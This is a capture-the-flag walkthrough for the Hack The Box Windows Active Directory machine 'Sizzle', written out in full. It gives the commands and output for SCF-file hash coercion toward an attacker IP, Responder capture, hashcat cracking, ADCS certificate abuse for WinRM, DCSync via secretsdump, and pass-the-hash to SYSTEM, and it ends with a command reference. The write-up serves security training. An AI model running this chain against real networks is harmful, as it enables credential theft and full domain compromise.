# Sizzle - Hack The Box Walkthrough

**Machine:** Sizzle  
**OS:** Windows (Active Directory)  
**Difficulty:** Insane  
**Target IP:** `10.129.1.1`  
**Attacker IP:** `10.10.14.6`  

---

## Table of Contents

1. [Introduction & Attack Path Overview](#introduction)
2. [Phase 1: Initial Reconnaissance](#phase-1-initial-reconnaissance)
3. [Phase 2: SMB Enumeration — Finding the Entry Point](#phase-2-smb-enumeration)
4. [Phase 3: The SCF Attack — Capturing Hashes](#phase-3-the-scf-attack)
5. [Phase 4: Hash Cracking — From Hash to Password](#phase-4-hash-cracking)
6. [Phase 5: Active Directory Certificate Services (ADCS)](#phase-5-adcs)
7. [Phase 6: Certificate-Based WinRM Authentication](#phase-6-winrm-shell)
8. [Phase 7: Post-Exploitation & The Shortcut](#phase-7-post-exploitation)
9. [Phase 8: DCSync — Stealing the Domain](#phase-8-dcsync)
10. [Phase 9: Pass-the-Hash — Becoming SYSTEM](#phase-9-pass-the-hash)
11. [Key Takeaways & Hacker Mindset](#key-takeaways)

---

## Introduction

Sizzle is an **Insane** difficulty Windows Active Directory machine. When you first see "Insane," your brain might scream "this will take 10 hours." But here's the first lesson in hacker mindset:

> **The difficulty rating measures the complexity of individual steps, not the number of steps. A well-chosen path through an Insane box can be faster than a Medium box with a long, winding road.**

The machine's core vulnerability chain is elegant:

```
Writable SMB Share → NTLM Hash Capture → Crack → ADCS Certificate → WinRM Shell → DCSync → Domain Admin
```

Every single step in this chain is a **real-world attack** you will encounter in actual Active Directory environments. Sizzle teaches you that corporate networks are often not compromised by zero-days, but by the **cumulative effect of small misconfigurations**.

---

## Phase 1: Initial Reconnaissance

### The Hacker Mindset: "What is this machine telling me?"

Before touching any exploit, we must understand what we're looking at. Reconnaissance is not just "running nmap." It is **listening to what the target is willing to tell you**.

### Step 1.1: Port Scanning with Nmap

```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.129.1.1
```

**What this command does:**
- `-p-` — Scan all 65,535 TCP ports. We do this because services sometimes run on non-standard ports.
- `-sS` — SYN scan (stealthy, doesn't complete the handshake).
- `--open` — Only show open ports (reduces noise).
- `--min-rate 5000` — Send at least 5,000 packets per second. On HTB/CTF networks, speed matters more than stealth.
- `-Pn` — Don't ping the host first. Windows often blocks ICMP, so skipping host discovery saves time.
- `-n` — Don't do DNS resolution. Faster.
- `-vvv` — Very verbose. Shows open ports as they're found.

**Why this matters:** You can't attack what you don't know exists. A full port scan is the foundation of everything.

### Step 1.2: Service Version Detection

```bash
nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986 -sCV -Pn -n -vvv -oN targeted 10.129.1.1
```

**Key ports discovered and what they mean:**

| Port | Service | What It Tells Us |
|------|---------|------------------|
| **21** | FTP | Anonymous login allowed. Usually a dead end, but worth checking. |
| **53** | DNS | Domain Controller behavior. Suggests Active Directory. |
| **80/443** | IIS 10.0 | Web server. Potential for web exploits, directory enumeration. |
| **135/139/445** | RPC / NetBIOS / SMB | **Critical.** SMB is where Windows shares files and printers. Often the weakest link. |
| **389/636/3268/3269** | LDAP / LDAPS / Global Catalog | **Active Directory confirmed.** These are domain controller ports. |
| **464** | Kerberos kpasswd | Password change service. Kerberos is running. |
| **5985/5986** | WinRM (HTTP/HTTPS) | Windows Remote Management. This is how we get PowerShell shells. |
| **9389** | AD Web Services | More Active Directory confirmation. |

**The Hacker Mindset:** Look at this port list. What do you see? You see a **domain controller**. Not just a random Windows server — this is an Active Directory environment. That immediately changes our strategy:

> **When you see LDAP + Kerberos + SMB + WinRM, you stop thinking "exploit a service" and start thinking "abuse Active Directory permissions and misconfigurations."**

---

## Phase 2: SMB Enumeration — Finding the Entry Point

### The Hacker Mindset: "Where can I write?"

SMB (Server Message Block) is Windows' file sharing protocol. In Active Directory, shares contain everything from software deployments to sensitive documents. But more importantly for us:

> **If you can write to an SMB share that other users access, you can force those users to authenticate to you. And when Windows authenticates, it sends hashes.**

### Step 2.1: Listing Available Shares

```bash
smbclient -N -L //10.129.1.1
```

**Output analysis:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
CertEnroll      Disk      Active Directory Certificate Services share
Department Shares Disk
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Operations      Disk
SYSVOL          Disk      Logon server share
```

**Why we care about each share:**
- `ADMIN$` and `C$` — Administrative shares. Only admins can access these.
- `CertEnroll` — Related to ADCS (Active Directory Certificate Services). We'll come back to this.
- `Department Shares` — **Non-default share.** This is user-created and therefore likely to have misconfigurations.
- `IPC$` — Inter-process communication. Sometimes accessible but limited.
- `NETLOGON` / `SYSVOL` — Domain controller shares. Usually read-only for domain users.
- `Operations` — Another non-default share.

**The Hacker Mindset:** Non-default shares (`Department Shares`, `Operations`) are created by administrators for business purposes. Business convenience often trumps security. **Always prioritize non-default shares in your enumeration.**

### Step 2.2: Accessing the Department Shares

```bash
smbclient "\\10.129.1.1\Department Shares" -N
```

Or, more conveniently, mount it locally:

```bash
sudo mkdir -p /mnt/sizzle
sudo mount -t cifs '//10.129.1.1/Department Shares' /mnt/sizzle -o username=guest,password=
```

**Why mount it?** Because once mounted, you can use all your Linux tools (`find`, `tree`, `touch`, scripts) to enumerate it. This is faster than navigating through `smbclient`'s interactive shell.

### Step 2.3: Finding Writable Directories

After mounting, we explore:

```bash
cd /mnt/sizzle && ls
```

We see many department folders: `Accounting`, `Audit`, `Banking`, `CEO_protected`, `Devops`, `Finance`, `HR`, `Infosec`, `Infrastructure`, `IT`, `Legal`, `M&A`, `Marketing`, `R&D`, `Sales`, `Security`, `Tax`, `Users`, `ZZ_ARCHIVE`.

**The critical question:** Which of these can we write to?

We create a simple test script:

```bash
#!/bin/bash
list=$(find /mnt/sizzle -type d)
for d in $list; do
    touch $d/x 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "$d is WRITABLE"
        rm $d/x
    fi
done
```

**Results:** Two directories are writable:
- `/mnt/sizzle/Users/Public`
- `/mnt/sizzle/ZZ_ARCHIVE`

**The Hacker Mindset — Why This Is Huge:**

> **A writable SMB share is not just a file storage location. It is a platform for coercion.**
>
> When a Windows user browses a folder containing certain file types, Windows automatically tries to load icons, thumbnails, or metadata. Each of these automatic actions can be weaponized to force the user to authenticate to an attacker-controlled server.

---

## Phase 3: The SCF Attack — Capturing Hashes

### The Hacker Mindset: "How do I make the machine authenticate to me?"

Windows loves to be helpful. When you open a folder in File Explorer, Windows tries to:
1. Show file icons
2. Show thumbnails for images/videos
3. Read file metadata
4. Load folder customization files

If any of these operations reference a remote resource (like `\\attacker-ip\share\icon.ico`), Windows will **automatically attempt to authenticate** to that remote server using the current user's credentials.

### Step 3.1: Understanding the SCF File

SCF stands for **Shell Command File**. It's a legacy Windows format used for folder customization. The key feature:

```scf
[Shell]
Command=2
IconFile=\\10.10.14.6\share\icon
[Taskbar]
Command=ToggleDesktop
```

**Why this works:**
- `IconFile` tells Windows: "When displaying this folder, load the icon from this network path."
- Windows sees `\\10.10.14.6\share\icon` and thinks: "I need to connect to that SMB server to get the icon."
- To connect, Windows sends the user's **NTLM authentication handshake**.
- If we run a tool like Responder on `10.10.14.6`, it intercepts this handshake and captures the hash.

### Step 3.2: Setting Up Responder

Responder is a tool that listens for LLMNR, NBT-NS, and MDNS broadcast requests, and poisons them to capture authentication attempts.

```bash
sudo responder -I tun0
```

**What Responder does:**
- It tells the network: "I am the server you're looking for."
- When Windows tries to reach `\\10.10.14.6\share`, Responder says: "That's me! Authenticate please."
- Windows sends the NTLMv2 challenge-response hash.
- Responder saves it.

### Step 3.3: Deploying the SCF File

```bash
cat << 'EOF' > sizzle.scf
[Shell]
Command=2
IconFile=\\10.10.14.6\share\icon
[Taskbar]
Command=ToggleDesktop
EOF

sudo cp sizzle.scf /mnt/sizzle/Users/Public/
```

**Why drop it in `Users/Public`?**
- `Public` is a special Windows folder accessible to all users.
- Automated processes, scripts, or users browsing the share will trigger it.
- The writeup noted that this share has an **auto-cleanup mechanism** (files deleted every ~4 minutes), but the hash is captured almost instantly.

### Step 3.4: Capturing the Hash

Within seconds to minutes, Responder catches an authentication:

```
[SMB] NTLMv2-SSP Client   : 10.129.1.1
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:1122334455667788:84CCC4737B262A694381F726F4E223EB:0101000000000000...
```

**The Hacker Mindset:** We didn't exploit a vulnerability. We didn't use a zero-day. We simply **placed a file in a writable location and let Windows do what Windows does**. This is called a **forced authentication attack** or **coerced authentication**, and it is one of the most reliable techniques in internal network penetration testing.

---

## Phase 4: Hash Cracking — From Hash to Password

### The Hacker Mindset: "Can I turn this hash into something usable?"

An NTLMv2 hash is not a password — it's a **challenge-response**. It proves the client knows the password, but it doesn't reveal the password directly. However, if the password is weak, we can "crack" it by trying millions of passwords until we find one that produces the same response.

### Step 4.1: Saving the Hash

```bash
cat << 'EOF' > amanda.hash
amanda::HTB:1122334455667788:84CCC4737B262A694381F726F4E223EB:010100000000000080F8ECDC69E8DC01A8E2F3D0C42B73330000000002000800370032005100420001001E00570049004E002D0041003900340043004400310046004A0044005400540004003400570049004E002D0041003900340043004400310046004A004400540054002E0037003200510042002E004C004F00430041004C000300140037003200510042002E004C004F00430041004C000500140037003200510042002E004C004F00430041004C000700080080F8ECDC69E8DC010600040002000000080030003000000000000000010000000020000076D3C35B73C6EFC9083B6D6C64F5499AE676A028DDCE1DC149326C5446C268F50A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003600000000000000000000000000
EOF
```

### Step 4.2: Cracking with Hashcat

```bash
hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
```

**Why hashcat mode 5600?**
- Hashcat uses numeric modes to identify hash types.
- Mode 5600 = NetNTLMv2 (the format Responder captured).

**Why rockyou.txt?**
- `rockyou.txt` is a wordlist containing ~14 million real passwords leaked from the RockYou breach in 2009.
- It remains one of the most effective wordlists because humans are predictable.

### Step 4.3: The Result

```
Ashare1972       (amanda)
```

**The Hacker Mindset:** `Ashare1972` is a weak password. It follows a common pattern: **Name fragment + word + year**. This is exactly the kind of password corporate users create when forced to follow "complexity requirements" without understanding security.

> **Password complexity rules (uppercase + lowercase + number + symbol) don't stop humans from being predictable. They just force users to append `123` or `!` to their existing weak passwords.**

---

## Phase 5: Active Directory Certificate Services (ADCS)

### The Hacker Mindset: "Why can't I just WinRM with this password?"

With credentials in hand, the natural next step is:

```bash
evil-winrm -i 10.129.1.1 -u amanda -p 'Ashare1972'
```

But this fails with a strange error:
```
Error: Unable to parse authorization header. Headers: {...} Body: (401)
```

**Why does this happen?**

This machine has a policy that **disables password-based WinRM authentication**. Instead, it requires **certificate-based authentication**. This is actually a security feature — but like all security features, it creates new attack surface.

**What is ADCS?**

Active Directory Certificate Services is Microsoft's Public Key Infrastructure (PKI). It issues digital certificates that can be used for:
- Encrypting files
- Signing code
- **Authenticating to services (including WinRM)**

The `/certsrv` endpoint is a web interface where authenticated users can request certificates. And guess what? `amanda` is an authenticated user.

### Step 5.1: Discovering the certsrv Endpoint

During web enumeration, directory brute-forcing reveals:

```
/certsrv          (Status: 401)
```

The `401` status means it requires authentication. We have credentials, so we can access it.

### Step 5.2: Generating a Certificate Signing Request (CSR)

To get a certificate, we first need to create a private key and a Certificate Signing Request (CSR). The CSR contains our public key and identity information, which the Certificate Authority (CA) will sign.

```bash
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

**What this does:**
- `-newkey rsa:2048` — Create a new 2048-bit RSA key pair.
- `-nodes` — No DES encryption (don't encrypt the private key with a password).
- `-keyout amanda.key` — Save the private key.
- `-out amanda.csr` — Save the Certificate Signing Request.

You will be prompted for information (Country, Organization, etc.). You can fill in anything — it doesn't matter for authentication purposes.

### Step 5.3: Requesting the Certificate via Web Interface

1. Navigate to `http://10.129.1.1/certsrv`
2. Login with `amanda` / `Ashare1972`
3. Click **"Request a certificate"**
4. Click **"advanced certificate request"**
5. Paste the contents of `amanda.csr` into the large text field
6. Select **"User"** as the Certificate Template
7. Click **Submit**
8. Select **"Base 64 encoded"**
9. Click **"Download certificate"** — save as `certnew.cer`

**Why this works:** In ADCS, the "User" certificate template allows any authenticated domain user to request a certificate that can be used for client authentication. The CA trusts the request because `amanda` provided valid domain credentials.

**The Hacker Mindset:**

> **We didn't hack the certificate authority. We asked it nicely, and it said yes because we had valid credentials. This is the core principle of post-exploitation: legitimate access with malicious intent.**

---

## Phase 6: Certificate-Based WinRM Authentication

### The Hacker Mindset: "I have a key. Now I need a door."

WinRM (Windows Remote Management) is Microsoft's implementation of WS-Management protocol. It's essentially SSH for Windows — it gives you a PowerShell remote shell.

Ports:
- `5985` — WinRM over HTTP
- `5986` — WinRM over HTTPS (what we need for certificate auth)

### Step 6.1: Connecting with evil-winrm

evil-winrm supports certificate authentication:

```bash
evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.1.1 -u 'amanda' -p 'Ashare1972'
```

**Parameters explained:**
- `-S` — Use SSL (required for certificate auth on port 5986)
- `-c certnew.cer` — The certificate issued by the CA
- `-k amanda.key` — Our private key (proves we own the certificate)
- `-u amanda` — The username the certificate was issued for
- `-p 'Ashare1972'` — Still needed for some evil-winrm internals, even though auth is certificate-based

**Success:**
```powershell
*Evil-WinRM* PS C:\Users\amanda\Documents> whoami
htb\amanda
```

**The Hacker Mindset:**

> **We turned a captured hash → cracked password → web portal access → signed certificate → remote shell. Every step was legitimate from the system's perspective. The system was doing exactly what it was designed to do. We just chained those designed behaviors into an attack path.**

---

## Phase 7: Post-Exploitation & The Shortcut

### The Hacker Mindset: "I'm in. What's already here?"

Once inside, most beginners immediately start uploading enumeration tools. But the experienced hacker first asks:

> **"What has someone already left behind?"**

### Step 7.1: Checking the Shell Environment

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Output: `ConstrainedLanguage`

**What is ConstrainedLanguage mode?**
- PowerShell has multiple language modes: `FullLanguage`, `ConstrainedLanguage`, `RestrictedLanguage`, `NoLanguage`.
- `ConstrainedLanguage` blocks many .NET and COM object interactions, making it harder to run certain post-exploitation tools.
- It is often enabled by AppLocker or Device Guard.

This means we can't easily run SharpHound, certain PowerShell download cradles, or .NET executables from memory. We would need a bypass (like PSBypassCLM) to escalate to `FullLanguage` mode.

**But wait** — do we need a better shell right now?

### Step 7.2: The Shortcut — file.txt

```powershell
type C:\Windows\system32\file.txt
```

**Output:**
```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
------    ----  --  ----
HTB.LOCAL Guest 501 -
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
```

**What is this file?**

This appears to be a pre-existing dump of NTDS hashes or a collection of credential material left on the system. In a real engagement, finding such a file would indicate:
1. A previous attacker
2. A backup or migration artifact
3. An administrator's poorly secured credential store

**Why this is valuable:** It contains `mrlky`'s NTLM hash: `bceef4f6fe9c026d1d8dec8dce48adef`.

**The Hacker Mindset:**

> **Always look for low-hanging fruit on the system before uploading your own tools. The fastest path to privilege escalation is often something the machine is already telling you.**

---

## Phase 8: DCSync — Stealing the Domain

### The Hacker Mindset: "Who has the keys to the kingdom?"

In Active Directory, domain controllers replicate password data with each other using the DRSUAPI protocol. The DCSync attack abuses this: **if you have the right permissions, you can pretend to be a domain controller and ask for all password hashes.**

### Step 8.1: Why mrlky?

From the file.txt, we have `mrlky`'s hash. But why `mrlky` specifically? In a real engagement, we would run BloodHound to find who has DCSync rights. BloodHound would show that `mrlky` has:
- `GetChanges` — Can request directory changes
- `GetChangesAll` — Can request ALL directory changes (including passwords)

These two permissions together = **DCSync capability**.

**The Hacker Mindset:**

> **You don't need to be a Domain Admin to dump the domain. You just need a user with replication rights. AD permission misconfigurations are more common than you think.**

### Step 8.2: Running secretsdump.py

We run this from our Kali machine using `mrlky`'s hash:

```bash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef htb.local/mrlky@10.129.1.1
```

**What happens:**
- We authenticate as `mrlky` using Pass-the-Hash (no plaintext password needed).
- We call the DRSUAPI `GetNCChanges` function.
- The domain controller sends us the NTDS.dit secrets — all password hashes in the domain.

**Output (truncated):**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
```

**Fresh Administrator hash:** `f6b7160bfc91823792e0ac3a162c9267`

**Note:** The hash from `file.txt` was stale (`c718f548...`), but DCSync gives us the **current** hash. This is why we didn't skip directly to PTH with the file.txt hash — stale hashes fail.

**The Hacker Mindset:**

> **DCSync is the ultimate Active Directory attack. With one command, you turn a single compromised user into full domain compromise. If a user has GetChangesAll, they are effectively a Domain Admin — even if they're not in the Domain Admins group.**

---

## Phase 9: Pass-the-Hash — Becoming SYSTEM

### The Hacker Mindset: "I don't need your password. I have your hash."

In Windows authentication, the **NTLM hash** is what actually proves identity. When you type a password, Windows converts it to an NTLM hash and uses that hash for everything. This means:

> **If you have the NTLM hash, you don't need the password. You can "pass the hash" directly to authenticate.**

### Step 9.1: PTH with psexec.py

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 htb.local/Administrator@10.129.1.1
```

**What psexec does:**
1. Authenticates to SMB using the Administrator hash
2. Uploads a service executable to `ADMIN$` (which is `C:\Windows`)
3. Creates and starts a Windows service
4. The service runs as `SYSTEM`
5. We get a command shell

**Success:**
```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### Step 9.2: Grabbing the Flags

```cmd
type C:\Users\mrlky\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

**Results:**
```
e6062d[redacted]8c052c0b1e
d9d0a5[redacted]38d5d7c444e
```

**The Hacker Mindset:**

> **Pass-the-Hash is why password hash dumps are so devastating. Even if every user changes their password tomorrow, the attacker who has the old NTLM hash can still authenticate — until the account is explicitly disabled or the password is changed twice (to clear the password history).**

---

## Key Takeaways & Hacker Mindset

### 1. Chain the Misconfigurations

Sizzle is not compromised by one vulnerability. It is compromised by a **chain**:
- Writable SMB share (misconfiguration)
- SCF file triggers authentication (design behavior)
- Weak password allows cracking (human factor)
- ADCS allows certificate issuance (design behavior)
- WinRM accepts certificate auth (design behavior)
- mrlky has DCSync rights (permission misconfiguration)
- Pass-the-Hash completes compromise (protocol design)

> **Each individual step is "working as intended." The attack emerges from the interaction of these intended behaviors.**

### 2. Forced Authentication Is Silent and Deadly

The SCF attack requires no exploit, no vulnerability scanner, no reverse shell. You drop a file and wait. It is:
- **Stealthy** — No logs of exploitation, just normal SMB activity
- **Reliable** — Windows ALWAYS tries to load icons
- **Effective** — Works on almost every Windows domain with writable shares

### 3. Certificates Are Credentials

When you see ADCS, think: "Can I get a certificate?" Certificates are often overlooked by defenders but grant the same access as passwords — sometimes more.

### 4. Look for What's Already There

Before uploading SharpHound, BloodHound, or any toolkit, look at what the system already contains:
- Log files with credentials
- Backup files
- Scripts with hardcoded passwords
- `file.txt` with dumped hashes

> **The fastest hack is the one you don't have to perform because someone already did it for you.**

### 5. DCSync Is Domain Death

If you can DCSync, the game is over. Every password in the domain is yours. The only recovery is a full forest recovery — rotating every password, resetting the KRBTGT password twice (to invalidate Golden Tickets), and auditing every account.

### 6. Hashes Are Passwords

Treat NTLM hashes with the same sensitivity as plaintext passwords. With Pass-the-Hash, they ARE passwords. A domain with LM hashes enabled, weak passwords, or excessive replication rights is a domain waiting to fall.

---

## Full Command Reference

```bash
# === PHASE 1: RECON ===
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.129.1.1
nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986 -sCV -Pn -n -vvv -oN targeted 10.129.1.1

# === PHASE 2: SMB ===
smbclient -N -L //10.129.1.1
sudo mkdir -p /mnt/sizzle
sudo mount -t cifs '//10.129.1.1/Department Shares' /mnt/sizzle -o username=guest,password=

# === PHASE 3: SCF ATTACK ===
cat << 'EOF' > sizzle.scf
[Shell]
Command=2
IconFile=\\10.10.14.6\share\icon
[Taskbar]
Command=ToggleDesktop
EOF
sudo cp sizzle.scf /mnt/sizzle/Users/Public/
sudo responder -I tun0

# === PHASE 4: CRACKING ===
# Save hash to amanda.hash, then:
hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt

# === PHASE 5: ADCS CERTIFICATE ===
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
# Submit CSR to http://10.129.1.1/certsrv, download certnew.cer

# === PHASE 6: WINRM SHELL ===
evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.1.1 -u 'amanda' -p 'Ashare1972'

# === PHASE 8: DCSYNC ===
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef htb.local/mrlky@10.129.1.1

# === PHASE 9: PASS-THE-HASH ===
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 htb.local/Administrator@10.129.1.1
```

---

*Happy hacking. Remember: every technique in this walkthrough is used by real attackers every day. Learn it, understand it, and defend against it.*
